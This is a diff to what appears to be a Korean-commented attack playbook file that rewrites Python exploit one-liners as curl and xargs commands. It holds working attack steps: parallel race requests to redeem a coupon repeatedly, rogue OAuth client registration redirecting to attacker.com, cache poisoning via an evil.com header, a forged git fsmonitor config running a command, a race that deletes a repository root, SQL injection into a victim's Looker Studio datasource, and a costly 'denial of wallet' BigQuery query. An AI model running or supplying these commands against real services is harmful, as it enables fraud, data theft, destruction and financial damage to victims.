@@ -585,13 +585,9 @@ X-Ignore: X""",
     "desc": "레이스 컨디션: 쿠폰중복→잔액초과인출→파일경쟁→포인트중복적립",
     "tools": ["burpsuite-turbo-intruder", "ffuf"],
     "commands": [
-        # Turbo Intruder 병렬 공격
-        """import concurrent.futures, requests
-def attack(i):
-    return requests.post('https://target.com/redeem', data={'code':'PROMO50'}, cookies={'session':'xxx'})
-with concurrent.futures.ThreadPoolExecutor(50) as e:
-    results = list(e.map(attack, range(50)))
-print([r.status_code for r in results])""",
+        # Turbo Intruder 병렬 공격 (bash+xargs)
+        "printf '%s\\n' $(seq 50) | xargs -P50 -I{} curl -sk -m 10 -X POST 'https://target.com/redeem' "
+        "-d 'code=PROMO50' -H 'Cookie: session=xxx' -o /tmp/race_{}.txt -w '%{http_code}\\n' | sort | uniq -c",
         # ffuf 병렬
         "ffuf -u https://target.com/transfer -X POST -d 'amount=1000' -H 'Cookie: sess=X' -w /dev/null -rate 100",
     ],
@@ -1524,12 +1520,11 @@ print([r.status_code for r in results])""",
         "curl -s https://TARGET/api/me -H 'Authorization: Bearer ACCESS_TOKEN'",
         "curl -s https://TARGET/api/profile -H 'Authorization: Bearer ACCESS_TOKEN'",
 
-        # 보조 자동화 스크립트
-        "python3 -c \""
-        "import requests, json; "
-        "r = requests.post('https://TARGET/oauth/register', "
-        "json={'client_name':'poc','redirect_uris':['https://attacker.com/cb']}); "
-        "print(json.dumps(r.json(), indent=2))\"",
+        # 보조 자동화 스크립트 (bash+curl)
+        "curl -sk -m 10 -X POST 'https://TARGET/oauth/register' "
+        "-H 'Content-Type: application/json' "
+        "-d '{\"client_name\":\"poc\",\"redirect_uris\":[\"https://attacker.com/cb\"]}' "
+        "| python3 -c \"import json,sys; print(json.dumps(json.loads(sys.stdin.read()), indent=2))\"",
     ],
     "payloads": [
         # 미인증 클라이언트 등록 페이로드
@@ -1618,11 +1613,8 @@ print([r.status_code for r in results])""",
 
         # Step 6: 영향 범위 확인
         "# 6) 동일 IdP를 사용하는 다른 서비스 목록화",
-        "python3 -c \""
-        "import requests; "
-        "r = requests.get('https://TARGET/api/me', "
-        "cookies={'session': 'ATTACKER_SESSION'}); "
-        "print(r.json())\"",
+        "curl -sk -m 10 'https://TARGET/api/me' -H 'Cookie: session=ATTACKER_SESSION' "
+        "| python3 -c \"import json,sys; print(json.dumps(json.loads(sys.stdin.read()), indent=2))\"",
     ],
     "payloads": [
         # 이메일 미검증 계정 생성
@@ -1851,11 +1843,10 @@ print([r.status_code for r in results])""",
         "# <a id=defaultView><a id=defaultView name=opener href=javascript:alert(1)>",
         "# <form id=x><input name=action value='javascript:alert(1)'>",
         "# 3) id/name 속성 DOMPurify 통과 여부 확인",
-        "python3 -c \""
-        "import requests; "
-        "r = requests.post('https://TARGET/api/comment', "
-        "json={'body':'<a id=x name=y href=javascript:void(0)>test</a>'}); "
-        "print('PASS' if 'id=x' in r.text else 'STRIP')\"",
+        "curl -sk -m 10 -X POST 'https://TARGET/api/comment' "
+        "-H 'Content-Type: application/json' "
+        "-d '{\"body\":\"<a id=x name=y href=javascript:void(0)>test</a>\"}' "
+        "| python3 -c \"import sys; r=sys.stdin.read(); print('PASS' if 'id=x' in r else 'STRIP')\"",
         "# 4) 전역 변수 clobber → 스크립트 실행 컨텍스트 분석",
         "# 브라우저 콘솔: document.getElementById('x') → window.x 확인",
         "# 5) XSS 체인 완성: IDOR → HTML 삽입 → clobber → alert(document.cookie)",
@@ -1885,10 +1876,8 @@ print([r.status_code for r in results])""",
     "tools": ["burpsuite", "browser-devtools", "python3"],
     "commands": [
         "# 1) Prototype Pollution 진입점 탐지",
-        "python3 -c \""
-        "import requests; "
-        "r = requests.get('https://TARGET/api/config?__proto__[polluted]=1'); "
-        "print(r.text[:200])\"",
+        "curl -sk -m 10 'https://TARGET/api/config?__proto__[polluted]=1' "
+        "| python3 -c \"import sys; print(sys.stdin.read()[:200])\"",
         "# 2) merge/extend 계열 함수 PP 테스트",
         "# POST /api/update {\"__proto__\":{\"isHTML\":true}} 응답 확인",
         "# 3) DOMPurify 버전 + PP 교차 테스트",
@@ -2022,10 +2011,7 @@ print([r.status_code for r in results])""",
         "curl -sk https://TARGET/api/v1/debug/protoDefinition",
         "curl -sk https://TARGET/internal/getProtoDefinition",
         "# 3) 노출된 Protobuf 스키마 분석",
-        "python3 -c \""
-        "import requests; "
-        "r = requests.get('https://TARGET/internal/proto'); "
-        "print(r.text[:2000])\"",
+        "curl -sk -m 10 'https://TARGET/internal/proto' | python3 -c \"import sys; print(sys.stdin.read()[:2000])\"",
         "# 4) 워크플로 실행 큐 접근",
         "curl -sk -X POST https://TARGET/internal/workflow/execute \\"
         "  -H 'Content-Type: application/json' \\"
@@ -2498,14 +2484,10 @@ print([r.status_code for r in results])""",
         "print(s.recv(4096).decode(errors='ignore'))\"",
         "# 3) Cache Poisoning 체인",
         "# 스머글된 요청으로 GET /로 캐시 오염",
-        "python3 -c \""
-        "# Step1: 스머글로 악의적 응답 캐시에 저장",
-        "import requests; "
-        "r = requests.get('https://TARGET/', headers={"
-        "    'Transfer-Encoding': ' chunked',"
-        "    'X-Forwarded-Host': 'evil.com'"
-        "}); "
-        "print('Cache poisoning attempted:', r.status_code)\"",
+        "# Step1: 스머글로 악의적 응답 캐시에 저장 (bash+curl)",
+        "STATUS=$(curl -sk -m 10 -o /dev/null -w '%{http_code}' 'https://TARGET/' "
+        "-H 'Transfer-Encoding: chunked' -H 'X-Forwarded-Host: evil.com'); "
+        "echo \"Cache poisoning attempted: ${STATUS}\"",
         "# 4) Pingora 버전 탐지",
         "curl -sI https://TARGET/ | grep -i 'server\\|x-powered\\|via'",
         "# 5) 자동화 도구",
@@ -2539,47 +2521,22 @@ print([r.status_code for r in results])""",
     ),
     "tools": ["burpsuite", "curl", "python3", "kubectl", "git"],
     "commands": [
-        "# 1) Looker Git 삭제 API 취약점 탐지",
+        "# 1) Looker Git 삭제 API 취약점 탐지 (bash+curl)",
         "# dir_path_array=[\"/\"]로 루트 삭제 시도",
-        "python3 -c \""
-        "import requests, json; "
-        "TARGET = 'https://LOOKER-TARGET'; "
-        "TOKEN = 'YOUR_API_TOKEN'; "
-        "headers = {'Authorization': f'token {TOKEN}', 'Content-Type': 'application/json'}; "
-        "# 정상 요청으로 프로젝트 확인"
-        "r = requests.get(f'{TARGET}/api/4.0/projects', headers=headers); "
-        "projects = r.json(); "
-        "print('Projects:', [p['id'] for p in projects[:3]])\"",
+        "curl -sk -m 10 '${TARGET}/api/4.0/projects' "
+        "-H 'Authorization: token ${TOKEN}' "
+        "| python3 -c \"import json,sys; p=json.loads(sys.stdin.read()); print('Projects:', [x['id'] for x in p[:3]])\"",
         "# 2) fsmonitor 훅 forged config 준비",
-        "python3 -c \""
-        "config_content = '''[core]\\n'"
-        "    bare = false\\n'"
-        "    worktree = \\\".\\\"\\n'"
-        "    fsmonitor = \\\"id > /tmp/pwned.txt\\\"\\n'"
-        "'''; "
-        "print('Forged git config:'); print(config_content)\"",
-        "# 3) TOCTOU 레이스 조건 공격 — 병렬 요청",
-        "python3 -c \""
-        "import requests, threading, time; "
-        "TARGET = 'https://LOOKER-TARGET'; "
-        "TOKEN = 'YOUR_API_TOKEN'; "
-        "PROJECT_ID = 'target-project'; "
-        "headers = {'Authorization': f'token {TOKEN}', 'Content-Type': 'application/json'}; "
-        "def trigger_git_status():"
-        "    for _ in range(100):"
-        "        requests.post(f'{TARGET}/api/internal/projects/{PROJECT_ID}/git_status', headers=headers);"
-        "        time.sleep(0.01);"
-        "def delete_repo():"
-        "    requests.post("
-        "        f'{TARGET}/api/internal/projects/{PROJECT_ID}/delete_dir',"
-        "        headers=headers,"
-        "        json={'dir_path_array': ['/']},"
-        "    );"
-        "t1 = threading.Thread(target=trigger_git_status); "
-        "t2 = threading.Thread(target=delete_repo); "
-        "t1.start(); time.sleep(0.1); t2.start(); "
-        "t1.join(); t2.join(); "
-        "print('Race condition attack complete')\"",
+        "printf '[core]\\nbare = false\\nworktree = \".\"\\nfsmonitor = \"id > /tmp/pwned.txt\"\\n' > /tmp/forged.git",
+        "echo '[+] Forged git config:'; cat /tmp/forged.git",
+        "# 3) TOCTOU 레이스 조건 공격 (bash+xargs)",
+        "printf '%s\\n' $(seq 100) | xargs -P20 -I{} curl -sk -m 5 -X POST "
+        "'${TARGET}/api/internal/projects/${PROJECT_ID}/git_status' "
+        "-H 'Authorization: token ${TOKEN}' -o /dev/null -w '%{http_code}\\n' &",
+        "curl -sk -m 10 -X POST '${TARGET}/api/internal/projects/${PROJECT_ID}/delete_dir' "
+        "-H 'Authorization: token ${TOKEN}' -H 'Content-Type: application/json' "
+        "-d '{\"dir_path_array\":[\"/\"]}' | python3 -c \"import json,sys; print(json.loads(sys.stdin.read()))\"",
+        "wait; echo 'Race condition attack complete'",
         "# 4) K8s 서비스 계정 권한 확인 (RCE 후)",
         "# kubectl auth can-i update secrets -n looker",
         "# curl -sk https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/looker/secrets \\",
@@ -2693,39 +2650,18 @@ print([r.status_code for r in results])""",
         "# 1) Looker Studio 보고서 API 탐지",
         "curl -s 'https://lookerstudio.google.com/api/ds/v1/datasources' "
         "-H 'Authorization: Bearer YOUR_TOKEN' | python3 -m json.tool | head -40",
-        "# 2) 0-click SQL Injection — Owner 자격증명 악용",
-        "python3 -c \""
-        "import requests, json; "
-        "# Alias Injection: 필드 alias에 SQL 주입"
-        "payload = {"
-        "    'datasourceId': 'VICTIM_DATASOURCE_ID',"
-        "    'fields': [{"
-        "        'id': 'qt_test',"
-        "        'name': \\\"qt_test' UNION SELECT session_user()--\\\","
-        "        'type': 'TEXT'"
-        "    }]"
-        "}; "
-        "r = requests.post("
-        "    'https://lookerstudio.google.com/api/ds/v1/query',"
-        "    json=payload,"
-        "    headers={'Authorization': 'Bearer YOUR_TOKEN'}"
-        "); "
-        "print('SQL Injection result:', r.text[:500])\"",
-        "# 3) BigQuery Denial of Wallet 공격",
-        "python3 -c \""
-        "# 피해자 BigQuery에 대용량 쿼리 강제 실행"
-        "import requests; "
-        "dos_query = 'SELECT * FROM `bigquery-public-data.github_repos.contents` CROSS JOIN UNNEST(GENERATE_ARRAY(1,10000))'; "
-        "payload = {"
-        "    'datasourceId': 'VICTIM_DATASOURCE_ID',"
-        "    'query': dos_query"
-        "}; "
-        "r = requests.post("
-        "    'https://lookerstudio.google.com/api/ds/v1/query',"
-        "    json=payload,"
-        "    headers={'Authorization': 'Bearer YOUR_TOKEN'}"
-        "); "
-        "print('Denial of Wallet triggered:', r.status_code)\"",
+        "# 2) 0-click SQL Injection — Owner 자격증명 악용 (bash+curl)",
+        "curl -sk -m 10 -X POST 'https://lookerstudio.google.com/api/ds/v1/query' "
+        "-H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json' "
+        "-d '{\"datasourceId\":\"VICTIM_DATASOURCE_ID\",\"fields\":[{\"id\":\"qt_test\","
+        "\"name\":\"qt_test' UNION SELECT session_user()--\",\"type\":\"TEXT\"}]}' "
+        "| python3 -c \"import sys; print('SQL Injection result:', sys.stdin.read()[:500])\"",
+        "# 3) BigQuery Denial of Wallet 공격 (bash+curl)",
+        "curl -sk -m 30 -X POST 'https://lookerstudio.google.com/api/ds/v1/query' "
+        "-H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json' "
+        "-d '{\"datasourceId\":\"VICTIM_DATASOURCE_ID\","
+        "\"query\":\"SELECT * FROM bigquery-public-data.github_repos.contents CROSS JOIN UNNEST(GENERATE_ARRAY(1,10000))\"}' "
+        "-o /dev/null -w 'Denial of Wallet triggered: %{http_code}\\n'",
         "# 4) XS-Leak — Frame Counting Oracle",
         "python3 -c \""
         "# iframe frame count로 응답 크기 추론 → 데이터 유출"
